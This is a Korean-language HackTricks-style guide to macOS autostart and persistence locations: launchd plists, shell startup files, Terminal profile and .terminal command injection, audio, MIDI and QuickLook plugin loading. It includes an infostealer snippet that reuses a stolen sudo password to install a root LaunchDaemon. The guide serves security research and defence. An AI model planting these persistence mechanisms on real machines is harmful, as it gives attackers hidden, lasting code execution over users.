# macOS 자동 시작

{{#include ../banners/hacktricks-training.md}}

이 섹션은 블로그 시리즈 [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/)를 기반으로 합니다. 파일을 쓸 수 있는 위치 중 나중에 코드 실행으로 이어질 수 있는 곳과 실행을 트리거하는 이벤트, 필요한 권한을 파악하는 것이 목적입니다. 특정 위치가 존재한다고 해서 해당 메커니즘이 활성화되어 있다는 뜻은 아닙니다. 아래에 설명된 로컬 확인은 macOS 26.5.2(2026년 10월 5일)에서 수행했으며, 모든 macOS 릴리스에서 동일하게 동작한다는 의미는 아닙니다.

> [!NOTE]
> “쓰기 트리거”가 항상 “파일을 쓴 직후 실행”을 의미하지는 않습니다. 일부 위치는 로그인 시, 특정 애플리케이션이 시작될 때 또는 사용자가 어떤 작업을 할 때만 읽힙니다. 이미 설정된 작업 내부의 페이로드를 쓸 수 있는 것과 새 작업을 등록할 권한이 있는 것은 별개입니다. 기법에 의존하기 전에 테스트용 계정이나 VM에서 확인하세요.

## Sandbox Bypass

> [!TIP]
> 여기서는 root 권한 없이 sandbox 내부에서 일반적으로 할 수 있는 **작업**, 정해진 **시간**이 지나기를 **기다리거나**, 매우 **흔한** 작업이 일어나기를 **기다리는 것만으로** 파일에 무언가를 **써서** 실행할 수 있는 **sandbox bypass**용 시작 위치를 확인할 수 있습니다.

### Launchd

- sandbox 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
- TCC 우회: [🔴](https://emojipedia.org/large-red-circle)

#### 위치

- **`/Library/LaunchAgents`**
  - **트리거**: 사용자 로그인(또는 명시적 등록)
  - root 권한 필요
- **`/Library/LaunchDaemons`**
  - **트리거**: 시스템 부팅(또는 명시적 등록)
  - root 권한 필요
- **`/System/Library/LaunchAgents`**
  - **트리거**: 사용자 로그인; Apple이 보호하는 시스템 위치
- **`/System/Library/LaunchDaemons`**
  - **트리거**: 시스템 부팅; Apple이 보호하는 시스템 위치
- **`~/Library/LaunchAgents`**
  - **트리거**: 다시 로그인할 때

`launchd`가 검색하는 `~/Library/LaunchDaemons` 위치는 없습니다. 사용자별 작업은 `~/Library/LaunchAgents`에 두고, 시스템 데몬 디렉터리는 `/Library/LaunchDaemons`입니다. [Apple의 launchd 시작 가이드](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html)에서 검색 대상 위치를 설명합니다.

> [!TIP]
> 흥미로운 점은 **`launchd`**가 Mach-o 섹션 `__Text.__config`에 내장된 property list를 가지고 있으며, 여기에는 launchd가 시작해야 하는 잘 알려진 다른 서비스가 포함되어 있다는 것입니다. 또한 이러한 서비스에는 실행 및 성공적인 완료가 요구됨을 나타내는 `RequireSuccess`, `RequireRun`, `RebootOnSuccess`가 포함될 수 있습니다.
>
> 물론, 코드 서명 때문에 수정할 수 없습니다.

#### 설명 및 악용

**`launchd`**는 OS X 커널이 시작 시 실행하는 **첫 번째 프로세스**이며 종료 시 마지막으로 끝나는 프로세스입니다. 항상 **PID 1**이어야 합니다. 이 프로세스는 다음 위치에 있는 **ASEP** **plist**에 지정된 구성을 **읽고 실행**합니다.

- `/Library/LaunchAgents`: 관리자가 설치한 사용자별 에이전트
- `/Library/LaunchDaemons`: 관리자가 설치한 시스템 전체 데몬
- `/System/Library/LaunchAgents`: Apple이 제공하는 사용자별 에이전트
- `/System/Library/LaunchDaemons`: Apple이 제공하는 시스템 전체 데몬

사용자가 로그인하면 `launchd`는 해당 사용자의 `~/Library/LaunchAgents`에 있는 plist를 그 사용자의 권한으로 로드합니다. 작업은 해당 키에 따라 시작되며, plist를 로드했다고 해서 프로세스가 즉시 실행되는 것은 아닙니다.

**에이전트와 데몬의 주요 차이점은 에이전트는 사용자가 로그인할 때 로드되고 데몬은 시스템이 시작될 때 로드된다는 점입니다**(예를 들어 ssh 같은 서비스는 사용자가 시스템에 접근하기 전에 실행되어야 합니다). 또한 에이전트는 GUI를 사용할 수 있지만 데몬은 백그라운드에서 실행되어야 합니다.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
        <string>com.apple.someidentifier</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>touch /tmp/launched</string>
    </array>
    <key>RunAtLoad</key><true/> <!--Execute at system startup-->
    <key>StartInterval</key>
    <integer>800</integer> <!--Execute each 800s-->
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key><false/> <!--Re-execute if exit unsuccessful-->
        <!--If previous is true, then re-execute in successful exit-->
    </dict>
</dict>
</plist>
```

각 `ProgramArguments` 요소는 별도의 인수입니다. `launchd`는 하나의 문자열을 셸 명령으로 파싱하지 않습니다. 위의 수정된 예제는 로드하지 않고 `plutil -lint /path/to/example.plist`로 구문을 검사할 수 있습니다. `ProgramArguments`, `RunAtLoad`, `KeepAlive` 항목은 로컬 `man launchd.plist`를 참조하세요.

#### 기존 작업의 파일 이벤트 트리거

**이미 로드된** 에이전트나 데몬은 `WatchPaths`를 사용해 지정된 경로가 변경될 때 시작될 수 있습니다. `QueueDirectories`는 디렉터리가 비어 있지 않을 때 작업을 시작하고, `StartOnMount`는 볼륨이 마운트될 때 작업을 시작합니다. [Apple의 launchd 가이드](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html#//apple_ref/doc/uid/10000172i-CH2-SW9)에는 `WatchPaths`와 `QueueDirectories` 예제가 있습니다. 감시 중인 파일에 쓰기를 하면 **이미 설정된 작업**이 트리거됩니다. 쓰기 권한을 가진 사용자가 해당 작업의 실행 파일, 스크립트 또는 작업이 해석하는 데이터도 제어할 수 있는 경우에만 임의 코드 실행이 가능합니다. 스캔되거나 등록된 위치 외부에 새 plist를 쓰는 것만으로는 plist가 로드되지 않습니다.

이 자동 정리 PoC는 고유한 이름의 **임시 사용자 에이전트**를 등록하고, 자체 감시 파일만 변경한 다음 에이전트를 제거합니다. 로그아웃이나 재시작 없이 macOS 26.5.2에서 성공적으로 실행되었습니다:

```python
import os, pathlib, plistlib, subprocess, tempfile, time, uuid

label = f"org.hacktricks.watchtest.{uuid.uuid4().hex}"
target = f"gui/{os.getuid()}"
with tempfile.TemporaryDirectory(prefix="ht-watch-") as root:
    base = pathlib.Path(root)
    watched, marker, plist = base / "watched", base / "ran", base / "agent.plist"
    watched.write_text("before\n")
    plist.write_bytes(plistlib.dumps({
        "Label": label,
        "ProgramArguments": ["/usr/bin/touch", str(marker)],
        "WatchPaths": [str(watched)],
        "RunAtLoad": False,
    }))
    subprocess.run(["launchctl", "bootstrap", target, str(plist)], check=True)
    try:
        marker.unlink(missing_ok=True)
        watched.write_text("after\n")
        for _ in range(30):
            if marker.exists():
                break
            time.sleep(0.1)
        print("watch fired:", marker.exists())
    finally:
        subprocess.run(["launchctl", "bootout", f"{target}/{label}"], check=True)
```

로컬 실행 결과는 `watch fired: True`였고, `bootout`도 성공했습니다. 여기서 `launchctl bootstrap`은 격리된 PoC 안에서만 사용하며, 이미 로드된 job에는 필요하지 않습니다. 기존 job을 안전하게 평가하려면 plist와 확인된 `ProgramArguments` 경로를 읽은 다음, 변경을 가하지 않고 관련 실행 파일이나 해석되는 파일에 쓰기 권한이 있는지 확인하세요.

사용자가 로그인하기 전에 실행되어야 하는 **Agent**도 있습니다. 이를 **PreLoginAgents**라고 합니다. 예를 들어, 로그인할 때 보조 기술을 제공하는 데 유용합니다. `/Library/LaunchAgents`에서도 찾을 수 있습니다([**여기**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents)에 예제가 있습니다).

> [!TIP]
> 새 Daemon 또는 Agent 설정 파일은 **다음 재부팅 후 또는** `launchctl load <target.plist>`를 사용하면 **로드됩니다**. 확장자가 없는 .plist 파일도 `launchctl -F <file>`로 **로드할 수 있습니다**(하지만 해당 plist 파일은 재부팅 후 자동으로 로드되지 않습니다).\
> `launchctl unload <target.plist>`를 사용해 **언로드**할 수도 있습니다(해당 파일이 가리키는 프로세스는 종료됩니다).
>
> override와 같은 요소가 Agent 또는 Daemon의 실행을 **방해하지 않도록** 하려면 다음을 실행하세요: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`

현재 사용자가 로드한 모든 Agent와 Daemon을 나열합니다:

```bash
launchctl list
```

#### 악성 LaunchDaemon 체인 예시 (비밀번호 재사용)

최근 macOS infostealer가 **탈취한 sudo 비밀번호**를 재사용해 user agent와 root LaunchDaemon을 설치했습니다:<sup>[[1]](#references)</sup>

- agent 루프를 `~/.agent`에 작성하고 실행 가능하게 만듭니다.
- 해당 agent를 가리키는 plist를 `/tmp/starter`에 생성합니다.
- 탈취한 비밀번호를 `sudo -S`와 함께 재사용해 plist를 `/Library/LaunchDaemons/com.finder.helper.plist`에 복사하고, 소유자를 `root:wheel`로 설정한 다음 `launchctl load`로 로드합니다.
- `nohup ~/.agent >/dev/null 2>&1 &`를 사용해 agent를 조용히 시작하고 출력을 분리합니다.

```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> `/Library/LaunchDaemons`에 배치한 daemon plist는 사용자 소유로 설정한다고 안전해지는 것이 아닙니다. `launchd`는 시스템 작업에 적절한 소유권과 권한을 요구하며, 안전하지 않은 plist를 거부할 수 있습니다. root 소유 daemon은 설정에서 다른 계정을 지정하지 않는 한 일반적으로 root로 실행됩니다. 작업의 `UserName`, `GroupName`, 소유권 및 `launchctl` 진단 결과를 확인하세요. plist 소유자의 이름만으로 실행 계정을 추측하지 마세요.

#### launchd에 대한 추가 정보

**`launchd`**는 **kernel**에서 시작되는 **첫 번째** 사용자 모드 프로세스입니다. 프로세스가 **성공적으로** 시작되어야 하며, **종료되거나 충돌해서는 안 됩니다**. 일부 **종료 신호**로부터도 **보호됩니다**.

`launchd`가 가장 먼저 하는 일 중 하나는 다음과 같은 **daemon**을 모두 **시작하는 것**입니다.

- 실행 시각을 기준으로 작동하는 **Timer daemon**:
  - macOS 26.5.2에서 `com.apple.atrun.plist`는 `StartInterval = 30`초로 `/usr/libexec/atrun`을 실행합니다. launchd가 재정의를 별도로 유지하므로 실제 활성화 상태는 plist의 `Disabled` 키와 다를 수 있습니다.
  - `/usr/lib/cron/tabs`에 작업이 있으면 `com.vix.cron.plist`가 `/usr/sbin/cron`을 실행합니다. `com.apple.systemstats.daily`는 cron daemon과는 별개의 예약 서비스입니다.
- 다음과 같은 **Network daemon**:
  - `org.cups.cups-lpd`: TCP(`SockType: stream`)에서 `SockServiceName: printer`로 수신 대기
    - SockServiceName은 포트이거나 `/etc/services`에 등록된 서비스여야 합니다.
  - `com.apple.xscertd.plist`: TCP 포트 1640에서 수신 대기
- 지정된 경로가 변경될 때 실행되는 **Path daemon**:
  - `com.apple.postfix.master`: 경로 `/etc/postfix/aliases`를 확인
- **IOKit 알림 daemon**:
  - `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port:**
  - `com.apple.xscertd-helper.plist`: `MachServices` 항목에 `com.apple.xscertd.helper`라는 이름이 지정되어 있습니다.
- **UserEventAgent:**
  - 이는 앞의 항목과 다릅니다. 특정 이벤트에 응답해 launchd가 앱을 시작하도록 합니다. 하지만 이 경우 관련된 주 바이너리는 `launchd`가 아니라 `/usr/libexec/UserEventAgent`입니다. SIP로 보호되는 폴더 `/System/Library/UserEventPlugins/`에서 플러그인을 불러오며, 각 플러그인은 `XPCEventModuleInitializer` 키에 초기화 프로그램을 지정합니다. 구형 플러그인의 경우 `Info.plist`에서 `CFPluginFactories` dict 아래 `FB86416D-6164-2070-726F-70735C216EC0` 키에 지정합니다.

### shell startup files

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)<sup>[[2]](#references)</sup>\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

- sandbox 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
  - 단, 이러한 파일을 불러오는 shell을 실행하는 TCC bypass 앱을 찾아야 합니다.

#### 위치

- **`~/.zshenv`** (또는 새로 컴파일된 **`~/.zshenv.zwc`**)
  - **트리거**: 비대화형 `zsh -c`를 포함해 일반적인 zsh 호출. `zsh -f`는 사용자 startup files를 건너뜁니다.
- **`~/.zshrc`**
  - **트리거**: 대화형 zsh가 시작될 때
- **`~/.zprofile`, `~/.zlogin`**
  - **트리거**: 로그인 zsh가 시작될 때. 각각 `.zshrc` 앞과 뒤에 읽힙니다.
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
  - **트리거**: zsh로 터미널을 열 때
  - root 권한 필요
- **`~/.zlogout`**
  - **트리거**: 로그인 zsh가 정상 종료될 때. 모든 터미널이나 shell 종료 시 실행되지는 않습니다.
- **`/etc/zlogout`**
  - **트리거**: zsh 터미널을 종료할 때
  - root 권한 필요
- 추가 정보: **`man zsh`**
- **`~/.bashrc`**
  - **트리거**: 대화형 **비로그인** Bash를 시작할 때. 대화형 로그인 Bash는 로그인 파일에서 명시적으로 불러오는 경우에만 이 파일을 읽습니다.
- **`~/.bash_profile`, `~/.bash_login`, `~/.profile`**
  - **트리거**: 로그인 Bash를 시작할 때. 이 순서대로 읽을 수 있는 첫 번째 파일이 실행됩니다. 앞의 두 파일 중 하나라도 있으면 `~/.profile`은 건너뜁니다.
- **`/etc/profile`**
  - **트리거**: 로그인 Bash를 시작할 때. 이 파일을 변경하려면 root 권한이 필요합니다.
- **`~/.tcshrc`** 또는 해당 파일이 없을 때 **`~/.cshrc`**
  - **트리거**: 이 Mac에서는 비대화형 `tcsh -c`를 포함해 `tcsh`를 시작할 때. 사용자가 실제로 `tcsh`를 호출해야 합니다. macOS의 기본 shell은 아닙니다.
- **`~/.login`**
  - **트리거**: 로그인 `tcsh`가 rc 파일 다음에 시작될 때
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
  - **트리거**: xterm에서 실행될 것으로 예상되지만, **설치되어 있지 않습니다**. 설치한 뒤에도 다음 오류가 발생합니다: xterm: `DISPLAY is not set`<sup>[[3]](#references)</sup>

#### 설명 및 악용

`zsh` 또는 `bash` 같은 shell 환경을 시작하면 **특정 startup files가 실행됩니다**. 현재 macOS의 기본 shell은 `/bin/zsh`입니다. Terminal 또는 SSH가 로그인 shell이나 대화형 shell을 시작하는지는 설정에 따라 다릅니다. 모든 세션에서 위의 파일이 전부 실행된다고 가정하지 마세요. macOS에는 `bash`와 `sh`도 있지만, 사용하려면 명시적으로 호출해야 합니다.<sup>[[2]](#references)</sup> [zsh startup-file reference](https://zsh.sourceforge.io/Doc/Release/Files.html)에는 실행 순서, `ZDOTDIR` 재정의, `.zwc` 규칙이 설명되어 있습니다.

macOS 26.5.2에서 임시 `ZDOTDIR`을 사용한 다음 읽기 전용 실험에서는 어떤 사용자 파일이 읽혔는지 확인했습니다. 실제 shell startup file은 변경하지 않았습니다.

```bash
lab=$(mktemp -d)
for name in zshenv zprofile zshrc zlogin zlogout; do
  printf 'print -r -- %s >> "$ZDOTDIR/seen"\n' "$name" > "$lab/.$name"
done
for flags in -c -ic -lc -lic; do
  : > "$lab/seen"
  ZDOTDIR="$lab" /bin/zsh "$flags" ':'
  printf '%s: %s\n' "$flags" "$(tr '\n' ' ' < "$lab/seen")"
done
rm -r "$lab"
```

관찰된 순서는 `-c`: `zshenv`; `-ic`: `zshenv zshrc`; `-lc`: `zshenv zprofile zlogin`; `-lic`: `zshenv zprofile zshrc zlogin zlogout`였습니다. `ZDOTDIR`은 대체 디렉터리를 이미 가리키고 있어야 합니다. 임의의 디렉터리에 파일을 작성하는 것만으로는 충분하지 않습니다.

[Bash의 시작 파일 참조 문서](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)는 login shell과 interactive shell을 구분합니다. macOS 26.5.2 테스트 머신에서 네 가지 사용자 시작 파일을 모두 포함한 격리된 `HOME`은 다음과 같은 결과를 냈습니다. `bash -c` → 없음, `bash -ic` → `.bashrc`, `bash -lc` 및 `bash -lic` → `.bash_profile`만 읽음. `.bash_profile`을 제거하면 login Bash는 `.bash_login`을 읽고, 이것도 제거하면 `.profile`을 읽었습니다. `BASH_ENV`를 사용하면 noninteractive Bash가 파일을 읽도록 지정할 수 있지만, 해당 환경 변수는 Bash를 실행하는 프로세스에 이미 설정되어 있어야 합니다. login Bash에서 명시적으로 `exit`하면 `~/.bash_logout`도 읽을 수 있습니다.

로컬 `tcsh(1)` 매뉴얼에는 별도의 시작 순서가 설명되어 있습니다. 임시 `HOME`에서 `/bin/tcsh -c :`는 `.tcshrc`를 읽고, `.tcshrc`가 없으면 `.cshrc`를 읽었습니다. 임시 login `tcsh`는 `.tcshrc`와 `.login`을 읽었습니다. 이 확인 과정에서는 임시 파일만 생성하고 제거했습니다.

### 다시 열리는 애플리케이션

> [!CAUTION]
> 표시된 설정을 구성한 뒤 로그아웃했다가 다시 로그인하거나, 심지어 재부팅해도 테스트 중에는 앱이 실행되지 않았습니다. 이러한 작업을 수행할 때 앱이 실행 중이어야 할 수 있습니다.

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)<sup>[[4]](#references)</sup>

- sandbox 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 위치

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
  - **트리거**: 재시작 시 애플리케이션 다시 열기

#### 설명 및 악용

다시 열 애플리케이션은 모두 plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist` 안에 있습니다.<sup>[[4]](#references)</sup>

따라서 다시 열 애플리케이션이 직접 만든 앱을 실행하도록 하려면 **앱을 목록에 추가**하면 됩니다.

UUID는 해당 디렉터리의 파일을 나열하거나 `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`를 실행해 확인할 수 있습니다.

다시 열릴 애플리케이션을 확인하려면 다음을 실행하면 됩니다.

```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

이 목록에 **애플리케이션을 추가하려면** 다음을 사용할 수 있습니다:

```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
    ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

### Terminal Preferences

작성 문서: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)<sup>[[5]](#references)</sup>

- sandbox 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
- TCC 우회: [✅](https://emojipedia.org/check-mark-button)
  - Terminal은 사용자의 FDA 권한을 보유하므로 이를 사용

#### 위치

- **`~/Library/Preferences/com.apple.Terminal.plist`**
  - **트리거**: 시작 명령이 포함된 Shell 설정의 프로필을 사용해 새 Terminal 창 또는 탭 열기

#### 설명 및 Exploitation

**`~/Library/Preferences`**에는 애플리케이션의 사용자 환경설정이 저장됩니다. 일부 환경설정에는 **다른 애플리케이션/스크립트를 실행하는** 설정이 포함될 수 있습니다.<sup>[[5]](#references)</sup>

예를 들어, Terminal은 시작 시 명령을 실행할 수 있습니다.

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

이 설정은 **`~/Library/Preferences/com.apple.Terminal.plist`** 파일에 다음과 같이 반영됩니다.

```bash
[...]
"Window Settings" => {
    "Basic" => {
      "CommandString" => "touch /tmp/terminal_pwn"
      "Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
      "FontAntialias" => 1
      "FontWidthSpacing" => 1.004032258064516
      "name" => "Basic"
      "ProfileCurrentVersion" => 2.07
      "RunCommandAsShell" => 0
      "type" => "Window Settings"
    }
[...]
```

관련 프로파일에 시작 명령이 포함되어 있고 Terminal이 해당 환경설정을 읽으면, 그 프로파일을 사용해 새 세션을 열 때 명령이 실행될 수 있습니다. [Apple의 최신 Terminal 안내서](https://support.apple.com/guide/terminal/trmlshll/mac)에는 프로파일별 **Shell → Startup** 명령이 설명되어 있습니다. 해당 프로파일을 사용해 새 세션을 열지 않고 Terminal을 열기만 해서는 충분하지 않습니다. 아래 환경설정 편집은 연구용 Mac에서 **실행하지 않았습니다**.

다음 명령을 cli에서 추가할 수 있습니다:

```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```

### Terminal Scripts / 기타 파일 확장자

- sandbox 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
- TCC 우회: [✅](https://emojipedia.org/check-mark-button)
  - Terminal은 사용자의 FDA 권한을 보유하므로 이를 활용

#### 위치

- **어디서나**
  - **트리거**: 특정 `.terminal`, `.command` 또는 `.tool` 파일 열기

#### 설명 및 익스플로잇

사용자가 **`.terminal`** 설정 파일을 열면 Terminal은 해당 프로필로 세션을 만들 수 있으며, 실행 가능한 **`.command`** 및 **`.tool`** 파일도 Terminal에서 열 수 있습니다. 이는 파일을 명시적으로 여는 동작이 트리거가 되는 것이며, 단순히 Terminal을 여는 것만으로 실행되는 것은 아닙니다. 상속되는 TCC 접근 권한은 Terminal에 실제로 부여된 권한과 시도하는 작업에 따라 달라집니다. 아래의 과거 사례는 연구용 Mac에서 실행하지 않았습니다.

다음과 같이 테스트해 보세요:

```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>CommandString</key>
	<string>/usr/bin/touch /tmp/ht-terminal-file-marker</string>
	<key>ProfileCurrentVersion</key>
	<real>2.0600000000000001</real>
	<key>RunCommandAsShell</key>
	<false/>
	<key>name</key>
	<string>exploit</string>
	<key>type</key>
	<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# After inspecting the marker, remove the disposable file and marker:
rm -f /tmp/test.terminal /tmp/ht-terminal-file-marker
```

또한 일반 셸 스크립트 콘텐츠를 포함하는 **`.command`**, **`.tool`** 확장자를 사용할 수도 있으며, 이 파일들도 Terminal에서 열립니다.

> [!CAUTION]
> Terminal에 **Full Disk Access**가 있으면 해당 작업을 완료할 수 있습니다(실행된 명령은 Terminal 창에 표시된다는 점에 유의하세요).

### Audio Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)<sup>[[6]](#references)</sup>\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)<sup>[[7]](#references)</sup>

- sandbox 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - 추가 TCC 접근 권한을 얻을 수도 있습니다.

#### 위치

- **`/Library/Audio/Plug-Ins/HAL`**
  - root 권한 필요
  - **Trigger**: Core Audio 서버가 호환되는 HAL device plug-in을 로드합니다. 서버를 재시작하면 다시 검색될 수 있습니다.
- **`/Library/Audio/Plug-ins/Components`**
  - root 권한 필요
  - **Trigger**: audio host가 설치된 Audio Unit을 검색하고 인스턴스화합니다.
- **`~/Library/Audio/Plug-ins/Components`**
  - **Trigger**: audio host가 설치된 Audio Unit을 검색하고 인스턴스화합니다.
- **`/System/Library/Components`**
  - Apple 제공 위치이며 시스템 보호 대상입니다.
  - **Trigger**: audio host가 일치하는 시스템 component를 인스턴스화합니다.

#### 설명

앞선 writeup에 따르면 일부 audio plugin을 **컴파일**해 로드되도록 할 수 있습니다.<sup>[[6]](#references)[[7]](#references)</sup>

HAL device plug-in과 Audio Unit은 서로 다른 로드 경로를 사용합니다. [Apple의 Audio Unit hosting guide](https://developer.apple.com/library/archive/documentation/MusicAudio/Conceptual/CoreAudioOverview/ARoadmaptoCommonTasks/ARoadmaptoCommonTasks.html)에 따르면 host는 component를 찾아 인스턴스화해야 합니다. 이를 검색 디렉터리에 복사하거나 `coreaudiod`를 재시작하는 것만으로는 실행이 입증되지 않습니다. AUv2 plugin은 host 프로세스에서 실행되는 반면, [Apple의 최신 Audio Unit 지침](https://developer.apple.com/documentation/audiotoolbox/incorporating-audio-effects-and-instruments)에 따르면 AUv3는 macOS에서 기본적으로 별도 프로세스에서 실행됩니다. Signature, sandbox, library-validation 관련 제한은 host에 따라 다릅니다. 연구용 Mac에는 audio plugin을 설치하거나 실행하지 않았습니다.

### CoreMIDI Drivers (MIDIServer)

Writeup: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- sandbox 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
  - 코드는 앱의 sandbox가 아니라 `MIDIServer` 프로세스 안에서 실행됩니다.
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - `MIDIServer`는 자체 `seatbelt` sandbox profile로 실행됩니다.

#### 위치

- **`~/Library/Audio/MIDI Drivers/*.plugin`**
  - root 권한 불필요(사용자 쓰기 가능)
  - **Trigger**: `MIDIServer`가 시작되거나 재시작됩니다. CoreMIDI를 사용하는 프로세스가 처음 실행될 때 필요에 따라 시작됩니다(*Audio MIDI Setup*, GarageBand, DAW 또는 WebMIDI를 사용하는 페이지 열기 등).
- **`/Library/Audio/MIDI Drivers/*.plugin`**
  - root 권한 필요
  - **Trigger**: 위와 동일

#### 설명 및 Exploitation

Apple의 `MIDIServer`(`/System/Library/Frameworks/CoreMIDI.framework/MIDIServer`)는 `Audio/MIDI Drivers` 디렉터리에서 MIDI **driver** 번들을 로드합니다. 이 바이너리는 Apple 서명되어 있지만 `com.apple.security.cs.disable-library-validation` entitlement가 포함되어 있으므로, **서명되지 않았거나 다른 팀에서 ad-hoc 서명한** 번들도 로드합니다. 그 결과 root 권한 없이 Apple 소유의 별도 프로세스 안에서 코드 실행이 가능합니다.<sup>[[53]](#references)</sup>

macOS 26에서 확인됨(읽기 전용):

```bash
# user-writable, no root needed
ls -ld ~/Library/"Audio/MIDI Drivers"            # exists, owned by the user
codesign -d --entitlements :- /System/Library/Frameworks/CoreMIDI.framework/MIDIServer 2>/dev/null \
  | grep disable-library-validation              # -> com.apple.security.cs.disable-library-validation
```

드라이버는 `MIDIDriverInterface` factory를 내보내는 표준 bundle입니다. factory/constructor에 payload를 넣으면 `MIDIServer`가 드라이버를 열거하는 즉시 실행됩니다. 이를 빌드한 다음 `~/Library/Audio/MIDI Drivers/Evil.plugin`에 두고 로그아웃이나 재부팅 없이 로드를 트리거합니다:

```bash
# starts MIDIServer, which scans the driver directories
open -a "Audio MIDI Setup"
```

### QuickLook 플러그인

Writeup: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)<sup>[[8]](#references)</sup>

- sandbox 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
- TCC 우회: [🟠](https://emojipedia.org/large-orange-circle)
  - 추가 TCC 접근 권한을 얻을 수도 있습니다.

#### 위치

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### 설명 및 악용

QuickLook 플러그인은 **파일 미리보기를 실행하면**(Finder에서 파일을 선택한 상태로 스페이스 바를 누르면) 해당 파일 형식을 지원하는 **플러그인이 설치되어 있는 경우** 실행될 수 있습니다.<sup>[[8]](#references)</sup>

직접 QuickLook 플러그인을 컴파일해 앞서 나온 위치 중 하나에 넣어 로드한 다음, 지원되는 파일로 이동해 스페이스 바를 눌러 실행할 수 있습니다.

